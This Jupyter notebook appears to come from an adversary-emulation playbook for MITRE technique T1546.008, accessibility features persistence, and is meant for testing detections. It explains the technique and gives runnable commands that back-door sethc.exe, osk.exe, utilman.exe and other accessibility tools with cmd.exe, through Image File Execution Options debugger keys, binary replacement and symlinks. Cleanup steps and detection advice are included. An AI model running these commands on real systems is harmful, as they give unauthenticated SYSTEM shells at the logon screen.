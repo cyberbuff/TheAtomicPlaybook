{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "29c621e9",
   "metadata": {},
   "source": "# T1546.008 - Accessibility Features\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>"
  },
  {
   "cell_type": "markdown",
   "id": "ab74ae52",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "e7a57b8e",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Attaches Command Prompt as a Debugger to a List of Target Processes",
    "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "00698a72",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a9e444f7",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39296f59",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c7387b6d",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Replace binary of sticky keys",
    "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nIF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b77b598",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "a2dfbf8d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ncopy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c28defae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6be4b11a",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create Symbolic Link From osk.exe to cmd.exe",
    "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nIF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b87dbe8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5cc0a33f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4f9ead4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.008 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7d3abe4c",
   "metadata": {},
   "source": "## Detection\nChanges to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}